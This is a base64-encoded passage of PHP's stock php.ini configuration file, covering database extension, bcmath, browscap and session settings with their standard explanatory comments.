lbmVyYWxseSBhICpiYWQqIGlkZWEgdG8gc3RvcmUgcGFzc3dvcmRzIGluIHRoaXMgZmlsZS4KOyAqQW55KiB1c2VyIHdpdGggUEhQIGFjY2VzcyBjYW4gcnVuICZhcG9zO2VjaG8gZ2V0X2NmZ192YXIoJnF1b3Q7bXlzcWxpLmRlZmF1bHRfcHcmcXVvdDspCjsgYW5kIHJldmVhbCB0aGlzIHBhc3N3b3JkISAgQW5kIG9mIGNvdXJzZSwgYW55IHVzZXJzIHdpdGggcmVhZCBhY2Nlc3MgdG8gdGhpcwo7IGZpbGUgd2lsbCBiZSBhYmxlIHRvIHJldmVhbCB0aGUgcGFzc3dvcmQgYXMgd2VsbC4KOyBodHRwOi8vcGhwLm5ldC9teXNxbGkuZGVmYXVsdC1wdwpteXNxbGkuZGVmYXVsdF9wdyA9Cgo7IEFsbG93IG9yIHByZXZlbnQgcmVjb25uZWN0Cm15c3FsaS5yZWNvbm5lY3QgPSBPZmYKCltteXNxbG5kXQo7IEVuYWJsZSAvIERpc2FibGUgY29sbGVjdGlvbiBvZiBnZW5lcmFsIHN0YXRpc3RpY3MgYnkgbXlzcWxuZCB3aGljaCBjYW4gYmUKOyB1c2VkIHRvIHR1bmUgYW5kIG1vbml0b3IgTXlTUUwgb3BlcmF0aW9ucy4KbXlzcWxuZC5jb2xsZWN0X3N0YXRpc3RpY3MgPSBPbgoKOyBFbmFibGUgLyBEaXNhYmxlIGNvbGxlY3Rpb24gb2YgbWVtb3J5IHVzYWdlIHN0YXRpc3RpY3MgYnkgbXlzcWxuZCB3aGljaCBjYW4gYmUKOyB1c2VkIHRvIHR1bmUgYW5kIG1vbml0b3IgTXlTUUwgb3BlcmF0aW9ucy4KbXlzcWxuZC5jb2xsZWN0X21lbW9yeV9zdGF0aXN0aWNzID0gT24KCjsgUmVjb3JkcyBjb21tdW5pY2F0aW9uIGZyb20gYWxsIGV4dGVuc2lvbnMgdXNpbmcgbXlzcWxuZCB0byB0aGUgc3BlY2lmaWVkIGxvZwo7IGZpbGUuCjsgaHR0cDovL3BocC5uZXQvbXlzcWxuZC5kZWJ1Zwo7bXlzcWxuZC5kZWJ1ZyA9Cgo7IERlZmluZXMgd2hpY2ggcXVlcmllcyB3aWxsIGJlIGxvZ2dlZC4KO215c3FsbmQubG9nX21hc2sgPSAwCgo7IERlZmF1bHQgc2l6ZSBvZiB0aGUgbXlzcWxuZCBtZW1vcnkgcG9vbCwgd2hpY2ggaXMgdXNlZCBieSByZXN1bHQgc2V0cy4KO215c3FsbmQubWVtcG9vbF9kZWZhdWx0X3NpemUgPSAxNjAwMAoKOyBTaXplIG9mIGEgcHJlLWFsbG9jYXRlZCBidWZmZXIgdXNlZCB3aGVuIHNlbmRpbmcgY29tbWFuZHMgdG8gTXlTUUwgaW4gYnl0ZXMuCjtteXNxbG5kLm5ldF9jbWRfYnVmZmVyX3NpemUgPSAyMDQ4Cgo7IFNpemUgb2YgYSBwcmUtYWxsb2NhdGVkIGJ1ZmZlciB1c2VkIGZvciByZWFkaW5nIGRhdGEgc2VudCBieSB0aGUgc2VydmVyIGluCjsgYnl0ZXMuCjtteXNxbG5kLm5ldF9yZWFkX2J1ZmZlcl9zaXplID0gMzI3NjgKCjsgVGltZW91dCBmb3IgbmV0d29yayByZXF1ZXN0cyBpbiBzZWNvbmRzLgo7bXlzcWxuZC5uZXRfcmVhZF90aW1lb3V0ID0gMzE1MzYwMDAKCjsgU0hBLTI1NiBBdXRoZW50aWNhdGlvbiBQbHVnaW4gcmVsYXRlZC4gRmlsZSB3aXRoIHRoZSBNeVNRTCBzZXJ2ZXIgcHVibGljIFJTQQo7IGtleS4KO215c3FsbmQuc2hhMjU2X3NlcnZlcl9wdWJsaWNfa2V5ID0KCltPQ0k4XQoKOyBDb25uZWN0aW9uOiBFbmFibGVzIHByaXZpbGVnZWQgY29ubmVjdGlvbnMgdXNpbmcgZXh0ZXJuYWwKOyBjcmVkZW50aWFscyAoT0NJX1NZU09QRVIsIE9DSV9TWVNEQkEpCjsgaHR0cDovL3BocC5uZXQvb2NpOC5wcml2aWxlZ2VkLWNvbm5lY3QKO29jaTgucHJpdmlsZWdlZF9jb25uZWN0ID0gT2ZmCgo7IENvbm5lY3Rpb246IFRoZSBtYXhpbXVtIG51bWJlciBvZiBwZXJzaXN0ZW50IE9DSTggY29ubmVjdGlvbnMgcGVyCjsgcHJvY2Vzcy4gVXNpbmcgLTEgbWVhbnMgbm8gbGltaXQuCjsgaHR0cDovL3BocC5uZXQvb2NpOC5tYXgtcGVyc2lzdGVudAo7b2NpOC5tYXhfcGVyc2lzdGVudCA9IC0xCgo7IENvbm5lY3Rpb246IFRoZSBtYXhpbXVtIG51bWJlciBvZiBzZWNvbmRzIGEgcHJvY2VzcyBpcyBhbGxvd2VkIHRvCjsgbWFpbnRhaW4gYW4gaWRsZSBwZXJzaXN0ZW50IGNvbm5lY3Rpb24uIFVzaW5nIC0xIG1lYW5zIGlkbGUKOyBwZXJzaXN0ZW50IGNvbm5lY3Rpb25zIHdpbGwgYmUgbWFpbnRhaW5lZCBmb3JldmVyLgo7IGh0dHA6Ly9waHAubmV0L29jaTgucGVyc2lzdGVudC10aW1lb3V0CjtvY2k4LnBlcnNpc3RlbnRfdGltZW91dCA9IC0xCgo7IENvbm5lY3Rpb246IFRoZSBudW1iZXIgb2Ygc2Vjb25kcyB0aGF0IG11c3QgcGFzcyBiZWZvcmUgaXNzdWluZyBhCjsgcGluZyBkdXJpbmcgb2NpX3Bjb25uZWN0KCkgdG8gY2hlY2sgdGhlIGNvbm5lY3Rpb24gdmFsaWRpdHkuIFdoZW4KOyBzZXQgdG8gMCwgZWFjaCBvY2lfcGNvbm5lY3QoKSB3aWxsIGNhdXNlIGEgcGluZy4gVXNpbmcgLTEgZGlzYWJsZXMKOyBwaW5ncyBjb21wbGV0ZWx5Lgo7IGh0dHA6Ly9waHAubmV0L29jaTgucGluZy1pbnRlcnZhbAo7b2NpOC5waW5nX2ludGVydmFsID0gNjAKCjsgQ29ubmVjdGlvbjogU2V0IHRoaXMgdG8gYSB1c2VyIGNob3NlbiBjb25uZWN0aW9uIGNsYXNzIHRvIGJlIHVzZWQKOyBmb3IgYWxsIHBvb2xlZCBzZXJ2ZXIgcmVxdWVzdHMgd2l0aCBPcmFjbGUgMTFnIERhdGFiYXNlIFJlc2lkZW50CjsgQ29ubmVjdGlvbiBQb29saW5nIChEUkNQKS4gIFRvIHVzZSBEUkNQLCB0aGlzIHZhbHVlIHNob3VsZCBiZSBzZXQgdG8KOyB0aGUgc2FtZSBzdHJpbmcgZm9yIGFsbCB3ZWIgc2VydmVycyBydW5uaW5nIHRoZSBzYW1lIGFwcGxpY2F0aW9uLAo7IHRoZSBkYXRhYmFzZSBwb29sIG11c3QgYmUgY29uZmlndXJlZCwgYW5kIHRoZSBjb25uZWN0aW9uIHN0cmluZyBtdXN0Cjsgc3BlY2lmeSB0byB1c2UgYSBwb29sZWQgc2VydmVyLgo7b2NpOC5jb25uZWN0aW9uX2NsYXNzID0KCjsgSGlnaCBBdmFpbGFiaWxpdHk6IFVzaW5nIE9uIGxldHMgUEhQIHJlY2VpdmUgRmFzdCBBcHBsaWNhdGlvbgo7IE5vdGlmaWNhdGlvbiAoRkFOKSBldmVudHMgZ2VuZXJhdGVkIHdoZW4gYSBkYXRhYmFzZSBub2RlIGZhaWxzLiBUaGUKOyBkYXRhYmFzZSBtdXN0IGFsc28gYmUgY29uZmlndXJlZCB0byBwb3N0IEZBTiBldmVudHMuCjtvY2k4LmV2ZW50cyA9IE9mZgoKOyBUdW5pbmc6IFRoaXMgb3B0aW9uIGVuYWJsZXMgc3RhdGVtZW50IGNhY2hpbmcsIGFuZCBzcGVjaWZpZXMgaG93CjsgbWFueSBzdGF0ZW1lbnRzIHRvIGNhY2hlLiBVc2luZyAwIGRpc2FibGVzIHN0YXRlbWVudCBjYWNoaW5nLgo7IGh0dHA6Ly9waHAubmV0L29jaTguc3RhdGVtZW50LWNhY2hlLXNpemUKO29jaTguc3RhdGVtZW50X2NhY2hlX3NpemUgPSAyMAoKOyBUdW5pbmc6IEVuYWJsZXMgc3RhdGVtZW50IHByZWZldGNoaW5nIGFuZCBzZXRzIHRoZSBkZWZhdWx0IG51bWJlciBvZgo7IHJvd3MgdGhhdCB3aWxsIGJlIGZldGNoZWQgYXV0b21hdGljYWxseSBhZnRlciBzdGF0ZW1lbnQgZXhlY3V0aW9uLgo7IGh0dHA6Ly9waHAubmV0L29jaTguZGVmYXVsdC1wcmVmZXRjaAo7b2NpOC5kZWZhdWx0X3ByZWZldGNoID0gMTAwCgo7IENvbXBhdGliaWxpdHkuIFVzaW5nIE9uIG1lYW5zIG9jaV9jbG9zZSgpIHdpbGwgbm90IGNsb3NlCjsgb2NpX2Nvbm5lY3QoKSBhbmQgb2NpX25ld19jb25uZWN0KCkgY29ubmVjdGlvbnMuCjsgaHR0cDovL3BocC5uZXQvb2NpOC5vbGQtb2NpLWNsb3NlLXNlbWFudGljcwo7b2NpOC5vbGRfb2NpX2Nsb3NlX3NlbWFudGljcyA9IE9mZgoKW1Bvc3RncmVTUUxdCjsgQWxsb3cgb3IgcHJldmVudCBwZXJzaXN0ZW50IGxpbmtzLgo7IGh0dHA6Ly9waHAubmV0L3Bnc3FsLmFsbG93LXBlcnNpc3RlbnQKcGdzcWwuYWxsb3dfcGVyc2lzdGVudCA9IE9uCgo7IERldGVjdCBicm9rZW4gcGVyc2lzdGVudCBsaW5rcyBhbHdheXMgd2l0aCBwZ19wY29ubmVjdCgpLgo7IEF1dG8gcmVzZXQgZmVhdHVyZSByZXF1aXJlcyBhIGxpdHRsZSBvdmVyaGVhZHMuCjsgaHR0cDovL3BocC5uZXQvcGdzcWwuYXV0by1yZXNldC1wZXJzaXN0ZW50CnBnc3FsLmF1dG9fcmVzZXRfcGVyc2lzdGVudCA9IE9mZgoKOyBNYXhpbXVtIG51bWJlciBvZiBwZXJzaXN0ZW50IGxpbmtzLiAgLTEgbWVhbnMgbm8gbGltaXQuCjsgaHR0cDovL3BocC5uZXQvcGdzcWwubWF4LXBlcnNpc3RlbnQKcGdzcWwubWF4X3BlcnNpc3RlbnQgPSAtMQoKOyBNYXhpbXVtIG51bWJlciBvZiBsaW5rcyAocGVyc2lzdGVudCtub24gcGVyc2lzdGVudCkuICAtMSBtZWFucyBubyBsaW1pdC4KOyBodHRwOi8vcGhwLm5ldC9wZ3NxbC5tYXgtbGlua3MKcGdzcWwubWF4X2xpbmtzID0gLTEKCjsgSWdub3JlIFBvc3RncmVTUUwgYmFja2VuZHMgTm90aWNlIG1lc3NhZ2Ugb3Igbm90Lgo7IE5vdGljZSBtZXNzYWdlIGxvZ2dpbmcgcmVxdWlyZSBhIGxpdHRsZSBvdmVyaGVhZHMuCjsgaHR0cDovL3BocC5uZXQvcGdzcWwuaWdub3JlLW5vdGljZQpwZ3NxbC5pZ25vcmVfbm90aWNlID0gMAoKOyBMb2cgUG9zdGdyZVNRTCBiYWNrZW5kcyBOb3RpY2UgbWVzc2FnZSBvciBub3QuCjsgVW5sZXNzIHBnc3FsLmlnbm9yZV9ub3RpY2U9MCwgbW9kdWxlIGNhbm5vdCBsb2cgbm90aWNlIG1lc3NhZ2UuCjsgaHR0cDovL3BocC5uZXQvcGdzcWwubG9nLW5vdGljZQpwZ3NxbC5sb2dfbm90aWNlID0gMAoKW2JjbWF0aF0KOyBOdW1iZXIgb2YgZGVjaW1hbCBkaWdpdHMgZm9yIGFsbCBiY21hdGggZnVuY3Rpb25zLgo7IGh0dHA6Ly9waHAubmV0L2JjbWF0aC5zY2FsZQpiY21hdGguc2NhbGUgPSAwCgpbYnJvd3NjYXBdCjsgaHR0cDovL3BocC5uZXQvYnJvd3NjYXAKO2Jyb3dzY2FwID0gZXh0cmEvYnJvd3NjYXAuaW5pCgpbU2Vzc2lvbl0KOyBIYW5kbGVyIHVzZWQgdG8gc3RvcmUvcmV0cmlldmUgZGF0YS4KOyBodHRwOi8vcGhwLm5ldC9zZXNzaW9uLnNhdmUtaGFuZGxlcgpzZXNzaW9uLnNhdmVfaGFuZGxlciA9IGZpbGVzCgo7IEFyZ3VtZW50IHBhc3NlZCB0byBzYXZlX2hhbmRsZXIuICBJbiB0aGUgY2FzZSBvZiBmaWxlcywgdGhpcyBpcyB0aGUgcGF0aAo7IHdoZXJlIGRhdGEgZmlsZXMgYXJlIHN0b3JlZC4gTm90ZTogV2luZG93cyB1c2VycyBoYXZlIHRvIGNoYW5nZSB0aGlzCjsgdmFyaWFibGUgaW4gb3JkZXIgdG8gdXNlIFBIUCZhcG9zO3Mgc2Vzc2lvbiBmdW5jdGlvbnMuCjsKOyBUaGUgcGF0aCBjYW4gYmUgZGVmaW5lZCBhczoKOwo7ICAgICBzZXNzaW9uLnNhdmVfcGF0aCA9ICZxdW90O047L3BhdGgmcXVvdDsKOwo7IHdoZXJlIE4gaXMgYW4gaW50ZWdlci4gIEluc3RlYWQgb2Ygc3RvcmluZyBhbGwgdGhlIHNlc3Npb24gZmlsZXMgaW4KOyAvcGF0aCwgd2hhdCB0aGlzIHdpbGwgZG8gaXMgdXNlIHN1YmRpcmVjdG9yaWVzIE4tbGV2ZWxzIGRlZXAsIGFuZAo7IHN0b3JlIHRoZSBzZXNzaW9uIGRhdGEgaW4gdGhvc2UgZGlyZWN0b3JpZXMuICBUaGlzIGlzIHVzZWZ1bCBpZgo7IHlvdXIgT1MgaGFzIHByb2JsZW1zIHdpdGggbWFueSBmaWxlcyBpbiBvbmUgZGlyZWN0b3J5LCBhbmQgaXMKOyBhIG1vcmUgZWZmaWNpZW50IGxheW91dCBmb3Igc2VydmVycyB0aGF0IGhhbmRsZSBtYW55IHNlc3Npb25zLgo7CjsgTk9URSAxOiBQSFAgd2lsbCBub3QgY3JlYXRlIHRoaXMgZGlyZWN0b3J5IHN0cnVjdHVyZSBhdXRvbWF0aWNhbGx5Lgo7ICAgICAgICAgWW91IGNhbiB1c2UgdGhlIHNjcmlwdCBpbiB0aGUgZXh0L3Nlc3Npb24gZGlyIGZvciB0aGF0IHB1cnBvc2UuCjsgTk9URSAyOiBTZWUgdGhlIHNlY3Rpb24gb24gZ2FyYmFnZSBjb2xsZWN0aW9uIGJlbG93IGlmIHlvdSBjaG9vc2UgdG8KOyAgICAgICAgIHVzZSBzdWJkaXJlY3RvcmllcyBmb3Igc2Vzc2lvbiBzdG9yYWdlCjsKOyBUaGUgZmlsZSBzdG9yYWdlIG1vZHVsZSBjcmVhdGVzIGZpbGVzIHVzaW5nIG1vZGUgNjAwIGJ5IGRlZmF1bHQuCjsgWW91IGNhbiBjaGFuZ2UgdGhhdCBieSB1c2luZwo7CjsgICAgIHNlc3Npb24uc2F2ZV9wYXRoID0gJnF1b3Q7TjtNT0RFOy9wYXRoJnF1b3Q7CjsKOyB3aGVyZSBNT0RFIGlzIHRoZSBvY3RhbCByZXByZXNlbnRhdGlvbiBvZiB0aGUgbW9kZS4gTm90ZSB0aGF0IHRoaXMKOyBkb2VzIG5vdCBvdmVyd3JpdGUgdGhlIHByb2Nlc3MmYXBvcztzIHVtYXNrLgo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24uc2F2ZS1wYXRoCjtzZXNzaW9uLnNhdmVfcGF0aCA9ICZxdW90Oy90bXAmcXVvdDsKCjsgV2hldGhlciB0byB1c2Ugc3RyaWN0IHNlc3Npb24gbW9kZS4KOyBTdHJpY3Qgc2Vzc2lvbiBtb2RlIGRvZXMgbm90IGFjY2VwdCBhbiB1bmluaXRpYWxpemVkIHNlc3Npb24gSUQsIGFuZAo7IHJlZ2VuZXJhdGVzIHRoZSBzZXNzaW9uIElEIGlmIHRoZSBicm93c2VyIHNlbmRzIGFuIHVuaW5pdGlhbGl6ZWQgc2Vzc2lvbiBJRC4KOyBTdHJpY3QgbW9kZSBwcm90ZWN0cyBhcHBsaWNhdGlvbnMgZnJvbSBzZXNzaW9uIGZpeGF0aW9uIHZpYSBhIHNlc3Npb24gYWRvcHRpb24KOyB2dWxuZXJhYmlsaXR5LiBJdCBpcyBkaXNhYmxlZCBieSBkZWZhdWx0IGZvciBtYXhpbXVtIGNvbXBhdGliaWxpdHksIGJ1dAo7IGVuYWJsaW5nIGl0IGlzIGVuY291cmFnZWQuCjsgaHR0cHM6Ly93aWtpLnBocC5uZXQvcmZjL3N0cmljdF9zZXNzaW9ucwpzZXNzaW9uLnVzZV9zdHJpY3RfbW9kZSA9IDAKCjsgV2hldGhlciB0byB1c2UgY29va2llcy4KOyBodHRwOi8vcGhwLm5ldC9zZXNzaW9uLnVzZS1jb29raWVzCnNlc3Npb24udXNlX2Nvb2tpZXMgPSAxCgo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24uY29va2llLXNlY3VyZQo7c2Vzc2lvbi5jb29raWVfc2VjdXJlID0KCjsgVGhpcyBvcHRpb24gZm9yY2VzIFBIUCB0byBmZXRjaCBhbmQgdXNlIGEgY29va2llIGZvciBzdG9yaW5nIGFuZCBtYWludGFpbmluZwo7IHRoZSBzZXNzaW9uIGlkLiBXZSBlbmNvdXJhZ2UgdGhpcyBvcGVyYXRpb24gYXMgaXQmYXBvcztzIHZlcnkgaGVscGZ1bCBpbiBjb21iYXRpbmcKOyBzZXNzaW9uIGhpamFja2luZyB3aGVuIG5vdCBzcGVjaWZ5aW5nIGFuZCBtYW5hZ2luZyB5b3VyIG93biBzZXNzaW9uIGlkLiBJdCBpcwo7IG5vdCB0aGUgYmUtYWxsIGFuZCBlbmQtYWxsIG9mIHNlc3Npb24gaGlqYWNraW5nIGRlZmVuc2UsIGJ1dCBpdCZhcG9zO3MgYSBnb29kIHN0YXJ0Lgo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24udXNlLW9ubHktY29va2llcwpzZXNzaW9uLnVzZV9vbmx5X2Nvb2tpZXMgPSAxCgo7IE5hbWUgb2YgdGhlIHNlc3Npb24gKHVzZWQgYXMgY29va2llIG5hbWUpLgo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24ubmFtZQpzZXNzaW9uLm5hbWUgPSBQSFBTRVNTSUQKCjsgSW5pdGlhbGl6ZSBzZXNzaW9uIG9uIHJlcXVlc3Qgc3RhcnR1cC4KOyBodHRwOi8vcGhwLm5ldC9zZXNzaW9uLmF1dG8tc3RhcnQKc2Vzc2lvbi5hdXRvX3N0YXJ0ID0gMAoKOyBMaWZldGltZSBpbiBzZWNvbmRzIG9mIGNvb2tpZSBvciwgaWYgMCwgdW50aWwgYnJvd3NlciBpcyByZXN0YXJ0ZWQuCjsgaHR0cDovL3BocC5uZXQvc2Vzc2lvbi5jb29raWUtbGlmZXRpbWUKc2Vzc2lvbi5jb29raWVfbGlmZXRpbWUgPSAwCgo7IFRoZSBwYXRoIGZvciB3aGljaCB0aGUgY29va2llIGlzIHZhbGlkLgo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24uY29va2llLXBhdGgKc2Vzc2lvbi5jb29raWVfcGF0aCA9IC8KCjsgVGhlIGRvbWFpbiBmb3Igd2hpY2ggdGhlIGNvb2tpZSBpcyB2YWxpZC4KOyBodHRwOi8vcGhwLm5ldC9zZXNzaW9uLmNvb2tpZS1kb21haW4Kc2Vzc2lvbi5jb29raWVfZG9tYWluID0KCjsgV2hldGhlciBvciBub3QgdG8gYWRkIHRoZSBodHRwT25seSBmbGFnIHRvIHRoZSBjb29raWUsIHdoaWNoIG1ha2VzIGl0CjsgaW5hY2Nlc3NpYmxlIHRvIGJyb3dzZXIgc2NyaXB0aW5nIGxhbmd1YWdlcyBzdWNoIGFzIEphdmFTY3JpcHQuCjsgaHR0cDovL3BocC5uZXQvc2Vzc2lvbi5jb29raWUtaHR0cG9ubHkKc2Vzc2lvbi5jb29raWVfaHR0cG9ubHkgPQoKOyBBZGQgU2FtZVNpdGUgYXR0cmlidXRlIHRvIGNvb2tpZSB0byBoZWxwIG1pdGlnYXRlIENyb3NzLVNpdGUgUmVxdWVzdCBGb3JnZXJ5IChDU1JGL1hTUkYpCjsgQ3VycmVudCB2YWxpZCB2YWx1ZXMgYXJlICZxdW90O1N0cmljdCZxdW90OywgJnF1b3Q7TGF4JnF1b3Q7IG9yICZxdW90O05vbmUmcXVvdDsuIFdoZW4gdXNpbmcgJnF1b3Q7Tm9uZSZxdW90OywKOyBtYWtlIHN1cmUgdG8gaW5jbHVkZSB0aGUgcXVvdGVzLCBhcyBgbm9uZWAgaXMgaW50ZXJwcmV0ZWQgbGlrZSBgZmFsc2VgIGluIGluaSBmaWxlcy4KOyBodHRwczovL3Rvb2xzLmlldGYub3JnL2h0bWwvZHJhZnQtd2VzdC1maXJzdC1wYXJ0eS1jb29raWVzLTA3CnNlc3Npb24uY29va2llX3NhbWVzaXRlID0KCjsgSGFuZGxlciB1c2VkIHRvIHNlcmlhbGl6ZSBkYXRhLiBwaHAgaXMgdGhlIHN0YW5kYXJkIHNlcmlhbGl6ZXIgb2YgUEhQLgo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24uc2VyaWFsaXplLWhhbmRsZXIKc2Vzc2lvbi5zZXJpYWxpemVfaGFuZGxlciA9IHBocAoKOyBEZWZpbmVzIHRoZSBwcm9iYWJpbGl0eSB0aGF0IHRoZSAmYXBvcztnYXJiYWdlIGNvbGxlY3Rpb24mYXBvczsgcHJvY2VzcyBpcyBzdGFydGVkIG9uIGV2ZXJ5Cjsgc2Vzc2lvbiBpbml0aWFsaXphdGlvbi4gVGhlIHByb2JhYmlsaXR5IGlzIGNhbGN1bGF0ZWQgYnkgdXNpbmcgZ2NfcHJvYmFiaWxpdHkvZ2NfZGl2aXNvciwKOyBlLmcuIDEvMTAwIG1lYW5zIHRoZXJlIGlzIGEgMSUgY2hhbmNlIHRoYXQgdGhlIEdDIHByb2Nlc3Mgc3RhcnRzIG9uIGVhY2ggcmVxdWVzdC4KOyBEZWZhdWx0IFZhbHVlOiAxCjsgRGV2ZWxvcG1lbnQgVmFsdWU6IDEKOyBQcm9kdWN0aW9uIFZhbHVlOiAxCjsgaHR0cDovL3BocC5uZXQvc2Vzc2lvbi5nYy1wcm9iYWJpbGl0eQpzZXNzaW9uLmdjX3Byb2JhYmlsaXR5ID0gMQoKOyBEZWZpbmVzIHRoZSBwcm9iYWJpbGl0eSB0aGF0IHRoZSAmYXBvcztnYXJiYWdlIGNvbGxlY3Rpb24mYXBvczsgcHJvY2VzcyBpcyBzdGFydGVkIG9uIGV2ZXJ5Cjsgc2Vzc2lvbiBpbml0aWFsaXphdGlvbi4gVGhlIHByb2JhYmlsaXR5IGlzIGNhbGN1bGF0ZWQgYnkgdXNpbmcgZ2NfcHJvYmFiaWxpdHkvZ2NfZGl2aXNvciwKOyBlLmcuIDEvMTAwIG1lYW5zIHRoZXJlIGlzIGEgMSUgY2hhbmNlIHRoYXQgdGhlIEdDIHByb2Nlc3Mgc3RhcnRzIG9uIGVhY2ggcmVxdWVzdC4KOyBGb3IgaGlnaCB2b2x1bWUgcHJvZHVjdGlvbiBzZXJ2ZXJzLCB1c2luZyBhIHZhbHVlIG9mIDEwMDAgaXMgYSBtb3JlIGVmZmljaWVudCBhcHByb2FjaC4KOyBEZWZhdWx0IFZhbHVlOiAxMDAKOyBEZXZlbG9wbWVudCBWYWx1ZTogMTAwMAo7IFByb2R1Y3Rpb24gVmFsdWU6IDEwMDAKOyBodHRwOi8vcGhwLm5ldC9zZXNzaW9uLmdjLWRpdmlzb3IKc2Vzc2lvbi5nY19kaXZpc29yID0gMTAwMAoKOyBBZnRlciB0aGlzIG51bWJlciBvZiBzZWNvbmRzLCBzdG9yZWQgZGF0YSB3aWxsIGJlIHNlZW4gYXMgJmFwb3M7Z2FyYmFnZSZhcG9zOyBhbmQKOyBjbGVhbmVkIHVwIGJ5IHRoZSBnYXJiYWdlIGNvbGxlY3Rpb24gcHJvY2Vzcy4KOyBodHRwOi8vcGhwLm5ldC9zZXNzaW9uLmdjLW1heGxpZmV0aW1lCnNlc3Npb24uZ2NfbWF4bGlmZXRpbWUgPSAxNDQwCgo7IE5PVEU6IElmIHlvdSBhcmUgdXNpbmcgdGhlIHN1YmRpcmVjdG9yeSBvcHRpb24gZm9yIHN0b3Jpbmcgc2Vzc2lvbiBmaWxlcwo7ICAgICAgIChzZWUgc2Vzc2lvbi5zYXZlX3BhdGggYWJvdmUpLCB0aGVuIGdhcmJhZ2UgY29sbGVjdGlvbiBkb2VzICpub3QqCjsgICAgICAgaGFwcGVuIGF1dG9tYXRpY2FsbHkuICBZb3Ugd2lsbCBuZWVkIHRvIGRvIHlvdXIgb3duIGdhcmJhZ2UKOyAgICAgICBjb2xsZWN0aW9uIHRocm91Z2ggYSBzaGVsbCBzY3JpcHQsIGNyb24gZW50cnksIG9yIHNvbWUgb3RoZXIgbWV0aG9kLgo7ICAgICAgIEZvciBleGFtcGxlLCB0aGUgZm9sbG93aW5nIHNjcmlwdCBpcyB0aGUgZXF1aXZhbGVudCBvZiBzZXR0aW5nCjsgICAgICAgc2Vzc2lvbi5nY19tYXhsaWZldGltZSB0byAxNDQwICgxNDQwIHNlY29uZHMgPSAyNCBtaW51dGVzKToKOyAgICAgICAgICBmaW5kIC9wYXRoL3RvL3Nlc3Npb25zIC1jbWluICsyNCAtdHlwZSBmIHwgeGFyZ3Mgcm0KCjsgQ2hlY2sgSFRUUCBSZWZlcmVyIHRvIGludmFsaWRhdGUgZXh0ZXJuYWxseSBzdG9yZWQgVVJMcyBjb250YWluaW5nIGlkcy4KOyBIVFRQX1JFRkVSRVIgaGFzIHRvIGNvbnRhaW4gdGhpcyBzdWJzdHJpbmcgZm9yIHRoZSBzZXNzaW9uIHRvIGJlCjsgY29uc2lkZXJlZCBhcyB2YWxpZC4KOyBodHRwOi8vcGhwLm5ldC9zZXNzaW9uLnJlZmVyZXItY2hlY2sKc2Vzc2lvbi5yZWZlcmVyX2NoZWNrID0KCjsgU2V0IHRvIHtub2NhY2hlLHByaXZhdGUscHVibGljLH0gdG8gZGV0ZXJtaW5lIEhUVFAgY2FjaGluZyBhc3BlY3RzCjsgb3IgbGVhdmUgdGhpcyBlbXB0eSB0byBhdm9pZCBzZW5kaW5nIGFudGktY2FjaGluZyBoZWFkZXJzLgo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24uY2FjaGUtbGltaXRlcgpzZXNzaW9uLmNhY2hlX2xpbWl0ZXIgPSBub2NhY2hlCgo7IERvY3VtZW50IGV4cGlyZXMgYWZ0ZXIgbiBtaW51dGVzLgo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24uY2FjaGUtZXhwaXJlCnNlc3Npb24uY2FjaGVfZXhwaXJlID0gMTgwCgo7IHRyYW5zIHNpZCBzdXBwb3J0IGlzIGRpc2FibGVkIGJ5IGRlZmF1bHQuCjsgVXNlIG9mIHRyYW5zIHNpZCBtYXkgcmlzayB5b3VyIHVzZXJzJmFwb3M7IHNlY3VyaXR5Lgo7IFVzZSB0aGlzIG9wdGlvbiB3aXRoIGNhdXRpb24uCjsgLSBVc2VyIG1heSBzZW5kIFVSTCBjb250YWlucyBhY3RpdmUgc2Vzc2lvbiBJRAo7ICAgdG8gb3RoZXIgcGVyc29uIHZpYS4gZW1haWwvaXJjL2V0Yy4KOyAtIFVSTCB0aGF0IGNvbnRhaW5zIGFjdGl2ZSBzZXNzaW9uIElEIG1heSBiZSBzdG9yZWQKOyAgIGluIHB1YmxpY2x5IGFjY2Vzc2libGUgY29tcHV0ZXIuCjsgLSBVc2VyIG1heSBhY2Nlc3MgeW91ciBzaXRlIHdpdGggdGhlIHNhbWUgc2Vzc2lvbiBJRAo7ICAgYWx3YXlzIHVzaW5nIFVSTCBzdG9yZWQgaW4gYnJvd3NlciZhcG9zO3MgaGlzdG9yeSBvciBib29rbWFya3MuCjsgaHR0cDovL3BocC5uZXQvc2Vzc2lvbi51c2UtdHJhbnMtc2lkCnNlc3Npb24udXNlX3RyYW5zX3NpZCA9IDAKCjsgU2V0IHNlc3Npb24gSUQgY2hhcmFjdGVyIGxlbmd0aC4gVGhpcyB2YWx1ZSBjb3VsZCBiZSBiZXR3ZWVuIDIyIHRvIDI1Ni4KOyBTaG9ydGVyIGxlbmd0aCB0aGFuIGRlZmF1bHQgaXMgc3VwcG9ydGVkIG9ubHkgZm9yIGNvbXBhdGliaWxpdHkgcmVhc29uLgo7IFVzZXJzIHNob3VsZCB1c2UgMzIgb3IgbW9yZSBjaGFycy4KOyBodHRwOi8vcGhwLm5ldC9zZXNzaW9uLnNpZC1sZW5ndGgKOyBEZWZhdWx0IFZhbHVlOiAzMgo7IERldmVsb3BtZW50IFZhbHVlOiAyNgo7IFByb2R1Y3Rpb24gVmFsdWU6IDI2CnNlc3Npb24uc2lkX2xlbmd0aCA9IDI2Cgo7IFRoZSBVUkwgcmV3cml0ZXIgd2lsbCBsb29rIGZvciBVUkxzIGluIGEgZGVmaW5lZCBzZXQgb2YgSFRNTCB0YWdzLgo7ICZsdDtmb3JtJmd0OyBpcyBzcGVjaWFsOyBpZiB5b3UgaW5jbHVkZSB0aGVtIGhlcmUsIHRoZSByZXdyaXRlciB3aWxsCjsgYWRkIGEgaGlkZGVuICZsdDtpbnB1dCZndDsgZmllbGQgd2l0aCB0aGUgaW5mbyB3aGljaCBpcyBvdGhlcndpc2UgYXBwZW5kZWQKOyB0byBVUkxzLiAmbHQ7Zm9ybSZndDsgdGFnJmFwb3M7cyBhY3Rpb24gYXR0cmlidXRlIFVSTCB3aWxsIG5vdCBiZSBtb2RpZmllZAo7IHVubGVzcyBpdCBpcyBzcGVjaWZpZWQuCjsgTm90ZSB0aGF0IGFsbCB2YWxpZCBlbnRyaWVzIHJlcXVpcmUgYSA